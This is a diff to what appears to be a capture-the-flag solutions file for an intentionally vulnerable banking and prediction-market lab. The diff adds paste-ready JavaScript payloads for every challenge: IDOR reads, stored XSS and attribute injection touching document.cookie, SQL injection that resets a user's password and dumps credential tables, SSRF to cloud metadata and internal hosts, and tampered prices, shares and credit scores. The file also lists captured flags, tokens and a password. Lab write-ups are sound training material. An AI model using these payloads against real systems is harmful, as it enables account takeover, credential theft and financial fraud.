@@ -233,6 +233,12 @@ await fetch('/api/bill-pay/payments', {method:'POST', credentials:'include', hea
 1. `GET /robots.txt` → reveals `Disallow: /debug`, `/test`, `/secrets`
 2. `GET /secrets` → HTML page with app credentials + flag
 
+**COPY-PASTE:**
+```javascript
+await fetch('/robots.txt').then(r=>r.text())         // see /secrets path
+await fetch('/secrets', {credentials:'include'}).then(r=>r.text())  // auto-detects
+```
+
 **Credentials leaked at /secrets:**
 - `AWS_ACCESS_KEY_ID`: `AKIAFAKE1234567890`
 - `AWS_SECRET_ACCESS_KEY`: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
@@ -243,56 +249,244 @@ await fetch('/api/bill-pay/payments', {method:'POST', credentials:'include', hea
 ### Paper Trail — 250 pts
 1. `GET /api/users/2/transactions/download` returns 200 PDF (user 1–5 work, 6–8 → 400)
 2. User 2 = **Priya Kapoor**, username **pkapoor**, accounts: DMACC1002/1007/1011/1013
-3. Downloaded via: `fetch('/api/users/2/transactions/download', {credentials:'include'})`
-4. Uploaded PDF to crwd-ctrl challenge form → 250 pts
+3. Download PDF and upload to crwd-ctrl challenge form
+
+**COPY-PASTE (download PDF and trigger upload dialog):**
+```javascript
+// Download the PDF
+let r = await fetch('/api/users/2/transactions/download', {credentials:'include'});
+let blob = await r.blob();
+let url = URL.createObjectURL(blob);
+let a = document.createElement('a'); a.href = url; a.download = 'paper-trail.pdf'; a.click();
+// Then: open crwd-ctrl Paper Trail challenge → SUBMIT → upload the downloaded PDF
+```
 
 ### Locked, But Not Really — 100 pts
-- Send 3+ wrong login attempts for `pkapoor`: `POST /api/auth/login` with wrong password
-- After attempt 3: `{"success":false,"blocked":true}` appears
-- Backend does NOT actually enforce the block
-- Just triggering `blocked:true` state completed the challenge
+- Send 3+ wrong login attempts for `pkapoor` → `blocked:true` auto-detected
+
+**COPY-PASTE:**
+```javascript
+for(let i=0;i<3;i++) await fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'pkapoor', password:'wrongpassword'})}).then(r=>r.json()).then(d=>console.log(d))
+```
 
 ### Knock and Listen — 50 pts
-- `GET /api/bill-pay/payments/{id}` returns:
-  - **403** `{"message":"Payment belongs to another account"}` → record exists, different user
-  - **404** `{"message":"Payment not found"}` → record doesn't exist
-- Our payment IDs: 1–52; ID 53+ = other users (all return 403)
+- `GET /api/bill-pay/payments/{id}`: 403 = other user's payment exists, 404 = doesn't exist
+
+**COPY-PASTE:**
+```javascript
+await fetch('/api/bill-pay/payments/53', {credentials:'include'}).then(r=>r.json())
+// Returns 403 → auto-detected
+```
 
 ### The Forgotten Rite — 120 pts
-- `GET /api/oracle/positions` returns our bets: IDs 7, 8, 9, 10…
-- `GET /api/oracle/positions/1` returns 200 → user 1's position (not ours!)
-- IDs 1–6 all accessible = other users' oracle positions (sequential int IDOR)
+- Sequential int IDOR on oracle positions — IDs 1–6 belong to other users
+
+**COPY-PASTE:**
+```javascript
+await fetch('/api/oracle/positions/1', {credentials:'include'}).then(r=>r.json())
+// Returns another user's position → auto-detected
+```
 
 ### A Tribute in Reverse — 100 pts
-- `POST /api/oracle/markets/1005/orders` with `{"side":"YES","shares":-100}`
-- Server accepts negative shares → `costCents: -5800` → wallet INCREASES by $58
-- Wallet went from $2500 → $2558
+- Negative shares on oracle order → money flows TO wallet
+
+**COPY-PASTE:**
+```javascript
+await fetch('/api/oracle/markets/1005/orders', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({side:'YES', shares:-100})}).then(r=>r.json())
+```
 
 ### Name Your Price — 150 pts
-- `POST /api/oracle/markets/1005/orders` with `{"side":"YES","shares":100,"entryPriceCents":1}`
-- Server accepts custom price → bought 100 shares at 1¢ each ($1) instead of 58¢ each ($58)
-- Response: `{"entryPriceCents":1,"costCents":100,"walletBalance":"2557.00"}`
+- Supply custom `entryPriceCents: 1` to buy at 1¢ per share instead of market price
+
+**COPY-PASTE:**
+```javascript
+await fetch('/api/oracle/markets/1005/orders', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({side:'YES', shares:100, entryPriceCents:1})}).then(r=>r.json())
+```
 
 ### Borrowed Confidence — 320 pts
-- `POST /api/loans` with `{"loanType":"PERSONAL","loanAmount":25000,"creditScore":850}`
-- Server accepts caller-supplied creditScore without verification → loan approved instantly
-- crwd-ctrl auto-detected when the loan was approved
+- Supply fake `creditScore: 850` — server never verifies
+
+**COPY-PASTE:**
+```javascript
+await fetch('/api/loans', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({loanType:'PERSONAL', loanAmount:25000, creditScore:850})}).then(r=>r.json())
+```
 
 ### Say It Again — 100 pts
-- `POST /api/transactions` with `{"fromAccountNo":"DMACC1001","toAccountNo":"DMACC1006","amount":1,"remarks":"<script>alert(document.cookie)</script>"}`
-- Then `GET /api/transactions/statement/print` renders remarks field unsanitized in HTML
-- crwd-ctrl auto-detected on the statement print request
+- Stored XSS in transaction remarks → statement print renders unsanitized
+
+**COPY-PASTE:**
+```javascript
+// Step 1: Store XSS payload in a transaction
+await fetch('/api/transactions', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({fromAccountNo:'DMACC1001', toAccountNo:'DMACC1006', amount:1, remarks:'<script>alert(document.cookie)</script>'})}).then(r=>r.json())
+
+// Step 2: View the statement — crwd-ctrl auto-detects
+await fetch('/api/transactions/statement/print', {credentials:'include'}).then(r=>r.text())
+// OR navigate to: https://50-18-145-16-darkmoneyprod.vulnerablesites.net/api/transactions/statement/print
+```
 
 ### By Any Other Name — 200 pts
-- `POST /api/accounts` with `{"productId":"high-yield-savings","openingDeposit":100,"fundingType":"INTERNAL","fromAccountNo":"DMACC1001","displayName":"<script>alert(1)</script>"}`
-- Server stores XSS payload in account displayName — form UI never allows custom names
-- crwd-ctrl auto-detected when accounts page loaded
+- XSS in account `displayName` — API field not exposed in UI
+
+**COPY-PASTE:**
+```javascript
+await fetch('/api/accounts', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({productId:'high-yield-savings', openingDeposit:100, fundingType:'INTERNAL', fromAccountNo:'DMACC1001', displayName:'<script>alert(1)</script>'})}).then(r=>r.json())
+// Then navigate to /accounts — crwd-ctrl auto-detects when XSS fires
+```
 
 ### The Prophecy That Speaks — 200 pts
-- XSS guard "V1" blocks `<script>` tags but NOT other event handlers
-- `POST /api/oracle/markets` with `description: "<img src=x onerror=alert(1)> — this is a test market..."`
-- Fields required: `question`, `description` (min 12), `category` (POP/TECH/OFFICE/CIVIC), `closesAt`, `initialYesCents` (1-99), `depositCents` (2500-1000000)
-- Navigate to the created market URL to trigger XSS — crwd-ctrl auto-detected
+- XSS guard blocks `<script>` but not event handlers like `onerror`
+
+**COPY-PASTE:**
+```javascript
+let r = await fetch('/api/oracle/markets', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({question:'Will this test market resolve YES?', description:'<img src=x onerror=alert(1)> test market description here', category:'TECH', closesAt:'2027-01-01T00:00:00', initialYesCents:50, depositCents:2500})}).then(r=>r.json())
+console.log('market id:', r.id)
+// Then navigate to: /oracle/markets/{id} — crwd-ctrl auto-detects when XSS fires
+```
+
+### Honest Answers — 260 pts
+- Single quote in search param causes unhandled DB error → 500
+
+**COPY-PASTE:**
+```javascript
+await fetch("/api/transactions?search='", {credentials:'include'}).then(r=>r.json())
+// Returns 500 DB error → auto-detected
+```
+
+### Second Chances — 500 pts
+- SQLi to call `reset_password_token(username, new_password)` stored procedure
+
+**COPY-PASTE (resets pkapoor's password to `Hacked123!`):**
+```javascript
+await fetch("/api/transactions?search=%25'%20OR%20reset_password_token('pkapoor','Hacked123!')%3E'a'%20OR%20'1'%3D'", {credentials:'include'}).then(r=>r.json())
+// Then verify: await fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'pkapoor', password:'Hacked123!'})}).then(r=>r.json())
+// Auto-detected on successful login with new password
+```
+
+### Ask a Crooked Question — 340 pts
+- SQLi on oracle search to exfiltrate flag from `oracle_service_secrets` table
+
+**COPY-PASTE:**
+```javascript
+// UNION SELECT: 7 cols (id, question, description, category, closesAt, initialYesCents, depositCents-ish)
+let url = "/api/oracle/markets?search=" + encodeURIComponent("x' UNION SELECT 1,secret_key,secret_value,'TECH',TIMESTAMP '9999-12-31 00:00:00',50,2500 FROM oracle_service_secrets WHERE secret_key='search_flag' AND 'x'='x");
+let r = await fetch(url, {credentials:'include'}).then(r=>r.json())
+console.log(r)  // flag in description field: 383342zBE-56aT13f3625
+// Submit to crwd-ctrl SUBMIT form under "Flag" field
+```
+
+### Trust Issues — 300 pts
+- SSRF via `rewardServiceUrl` parameter
+
+**COPY-PASTE:**
+```javascript
+// Step 1: Discover available files (gets 400 error with file list)
+await fetch('/api/cards/1/reward-points?rewardServiceUrl=http://localhost/', {credentials:'include'}).then(r=>r.json())
+
+// Step 2: Fetch the reward_client.json file containing the flag
+await fetch('/api/cards/1/reward-points?rewardServiceUrl=http://localhost/internal/files/reward_client.json', {credentials:'include'}).then(r=>r.json())
+// Returns: {"flag":"DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS"} → submit to crwd-ctrl SUBMIT form
+```
+
+### Loaded Questions — 100 pts
+- SQLi on connector endpoint → dump partner DB tables
+
+**COPY-PASTE:**
+```javascript
+// Trigger SQLi error (auto-detected)
+await fetch("/api/manual-links/connector?connectorId='", {credentials:'include'}).then(r=>r.json())
+
+// Dump tables
+let url = "/api/manual-links/connector?connectorId=" + encodeURIComponent("xxx' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),'x','x' FROM information_schema.tables WHERE table_schema=database()-- -");
+await fetch(url, {credentials:'include'}).then(r=>r.json())
+```
+
+### Overreach — 250 pts
+- SSRF via partner bank discover endpoint to AWS metadata
+
+**COPY-PASTE:**
+```javascript
+await fetch('/api/partner-banks/1/discover', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({discoveryHost:'169.254.169.254'})}).then(r=>r.json())
+// Returns AWS metadata + flag "B3D3C2zAD-254T609" → submit to crwd-ctrl SUBMIT form
+```
+
+### A Verdict Never Spoken — 400 pts + Speak as the Oracle — 200 pts
+- Settle an open/unresolved market (no seer token required on settle endpoint)
+
+**COPY-PASTE:**
+```javascript
+// Use the UI button (required for auto-detection): navigate to /oracle/resolutions → click "Consult the Oracle"
+// OR force-settle any OPEN/UNRESOLVED market via API:
+await fetch('/api/oracle/markets/1300/settle', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({outcome:'YES'})}).then(r=>r.json())
+// Try market IDs: 1001, 1002, 1005, 1300 (any OPEN market works)
+```
+
+### The Seer's Sigil — 300 pts
+- Hardcoded resolver token in JS DOM comment
+
+**COPY-PASTE:**
+```javascript
+// Find the token in page source
+let walker = document.createTreeWalker(document.body, NodeFilter.SHOW_COMMENT);
+let node; while(node = walker.nextNode()) console.log(node.nodeValue);
+// Token: ORCL-RSLVR-7c4f9a2e8b1d
+
+// Resolve market 1200 with the token
+await fetch('/api/oracle/markets/1200/resolve', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json', 'X-Oracle-Resolver-Token':'ORCL-RSLVR-7c4f9a2e8b1d'}, body: JSON.stringify({outcome:'YES'})}).then(r=>r.json())
+```
+
+### A Foregone Prophecy — 280 pts
+- Create market with past `closesAt` date → immediately resolve and settle
+
+**COPY-PASTE:**
+```javascript
+// Step 1: Create market with past close date
+let m = await fetch('/api/oracle/markets', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({question:'Past market test?', description:'Testing past date market creation', category:'TECH', closesAt:'2020-01-01T00:00:00', initialYesCents:1, depositCents:2500})}).then(r=>r.json())
+console.log('market id:', m.id)
+
+// Step 2: Buy shares
+await fetch('/api/oracle/markets/'+m.id+'/orders', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({side:'YES', shares:50})}).then(r=>r.json())
+
+// Step 3: Resolve with seer token
+await fetch('/api/oracle/markets/'+m.id+'/resolve', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json', 'X-Oracle-Resolver-Token':'ORCL-RSLVR-7c4f9a2e8b1d'}, body: JSON.stringify({outcome:'YES'})}).then(r=>r.json())
+
+// Step 4: Settle → auto-detected
+await fetch('/api/oracle/markets/'+m.id+'/settle', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({outcome:'YES'})}).then(r=>r.json())
+```
+
+### Inside Line — 300 pts
+- SSRF to `dmlink-config.internal` → link signing key
+
+**COPY-PASTE:**
+```javascript
+await fetch('/api/partner-banks/1/discover', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({discoveryHost:'dmlink-config.internal'})}).then(r=>r.json())
+// Returns link_signing_key: D3E346z93-ecbT72d2c9a66e → submit to crwd-ctrl SUBMIT form
+```
+
+### The Name Checks Out — 200 pts
+- SQLi dump partner bank user credentials → auth as atlantis.h1pp0
+
+**COPY-PASTE:**
+```javascript
+// Dump partner_bank_user table credentials
+let url = "/api/manual-links/connector?connectorId=" + encodeURIComponent("xxx' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '|'),'x','x' FROM partner_bank_user-- -");
+await fetch(url, {credentials:'include'}).then(r=>r.json())
+
+// Auth as atlantis.h1pp0 (the h1pp0 user) → auto-detected
+await fetch('/api/partner-banks/1/auth', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'atlantis.h1pp0', password:'7e3023bfc3bb1666fe3a0e76'})}).then(r=>r.json())
+```
+
+### Between the Lines — 250 pts
+- HTML attribute injection in bill-pay memo (unescaped `"` in title attribute)
+
+**COPY-PASTE:**
+```javascript
+// Step 1: Create payment with XSS in memo
+let r = await fetch('/api/bill-pay/payments', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({payeeId:1, fromAccountNumber:'DMACC1001', amount:1, sendDate:'2026-11-10', memo:'x" onmouseover="alert(document.cookie)', schedule:{frequency:'ONE_TIME'}})}).then(r=>r.json())
+console.log('payment id:', r.paymentId, 'ref:', r.reference)
+
+// Step 2: Navigate to payment detail page → hover over memo text → XSS fires → auto-detected
+// URL: https://50-18-145-16-darkmoneyprod.vulnerablesites.net/bill-pay/payments/{paymentId}
+```
 
 ---
 
